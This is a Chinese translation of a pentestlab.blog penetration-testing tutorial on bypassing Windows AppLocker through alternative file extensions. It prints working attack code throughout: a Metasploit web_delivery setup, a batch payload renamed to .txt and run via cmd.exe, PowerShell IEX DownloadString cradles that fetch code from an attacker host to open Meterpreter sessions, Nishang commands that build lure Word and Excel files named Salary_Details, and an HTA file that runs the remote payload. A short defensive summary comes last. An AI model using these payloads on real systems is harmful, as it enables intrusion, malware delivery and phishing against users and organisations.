# 【技术分享】AppLocker绕过之文件拓展名

阅读量 **132813**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-06-20 10:07:25

 **x**

##### 译文声明

本文是翻译文章，文章来源：pentestlab.blog

原文地址：<https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[牧野之鹰](http://bobao.360.cn/member/contribute?uid=877906634)

预估稿费：100RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

要绕过AppLocker的限制通常是使用受信赖的MS的二进制文件来执行代码或者利用弱路径规则。然而在系统中还有一种可行的方法，系统已经配置了默认规则，而规则是允许用户使用CMD和PowerShell，这时用户可以通过使用具有不同文件扩展名的有效载荷来绕过AppLocker。

可以使用Metasploit Web传递模块来托管将要使用的powershell有效载荷，并从目标中检索传入的连接。

代码如下：

    
    
    exploit/multi/script/web_delivery

网络传递模块 – PowerShell payload

默认情况下，直接从CMD执行.bat文件将被阻止。

AppLocker – bat文件上的限制

但是，通过将此文件的扩展名更改为.txt，并从CMD执行相同的有效载荷将返回一个Meterpreter会话。

代码如下：

    
    
    cmd.exe /K < payload.txt

CMD-以txt的方式执行bat文件

Payload.txt:

    
    
    @echo off
    Powershell.exe -nop -w hidden -c IEX (new-objectnet.webclient)
    .downloadstring('http://192.168.100.3:8080/9Q21wiSds9E0pxi');

**PAUSE**

在PowerShell中，可以使用Get-Content cmdlet读取txt文件的内容，Invoke-Expression可以运行payload-powershell.txt文件中包含的命令：

代码如下：

    
    
    IEX (new-objectnet.webclient).Downloadstring
    ('http://192.168.100.3:8080/9Q21wiSds9E0pxi');

PowerShell – 从txt执行有效载荷

Metasploit侦听器将收到两个Meterpreter会话：

Web Delivery – 获取Meterpreter会话

**  
**

**File Extensions**

应允许应用程序（如Microsoft Word和Excel）执行，并且可以作为另一种方法来传递绕过AppLocker的恶意有效载荷。 Nishang
PowerShell框架可以用于生成包含特定有效载荷的各种扩展，如：

.DOC

.XLS

.HTA

.LNK

应该注意的是，系统需要安装office，否则nishang将无法生成文件。

代码如下：

    
    
    PS C:nishangClient> Import-Module .Out-Word.ps1
    PS C:nishangClient> Import-Module .Out-Excel.ps1
    PS C:nishangClient> Out-Word -Payload "powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring(
    'http://192.168.100.3:8080/9Q21wiSds9E0pxi');"
    Saved to file C:nishangClientSalary_Details.doc
     
    PS C:nishangClient> Out-Excel -Payload "powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring
    ('http://192.168.100.3:8080/9Q21wiSds9E0pxi');"
    Saved to file C:nishangClientSalary_Details.xls

Nishang – 嵌有payload的Word和Excel

Nishang还有两个PowerShell脚本，可以生成嵌有PowerShell payloads 的CHM文件和快捷方式。
需要注意的是，Nishang依赖于HTML Help Workshop应用程序来生成.CHM文件。

Nishang – 编译嵌有payload的HTML文件和快捷方式

以下代码（.HTA文件）可用来绕过AppLocker和其他应用程序白名单软件。

代码如下：

    
    
    <HTML>
    <HEAD>
    <script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.3:8080/9Q21wiSds9E0pxi')"
    </script>
    </HEAD>
    <BODY>
    </BODY>
    </HTML>

下面所有类型的文件都可以用来执行远程托管的powershell payload以绕过AppLocker规则。

Nishang – 生成的文件扩展名

  

**总结**

如果只是启用了AppLocker
但是并没有阻止CMD和powershell,即使特定类型的文件被阻止了，代码仍然可以执行。如果某些可信赖的应用当前并没有提供特定业务（也就是空在那里没有起作用）的话，系统所有者和IT管理员应该删除他们，应为他们拥有执行代码的能力，这是潜在的危险。除此之外还应该对标准用户禁止CMD，DLL规则也应该开启。

本文翻译自pentestlab.blog [原文链接](https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **牧野之鹰** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86290](/post/id/86290)

安全客 - 有思想的安全新媒体

本文转载自: [pentestlab.blog](https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/)

如若转载,请注明出处： <https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t013494c7eecab51c55.jpg) 牧野之鹰

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

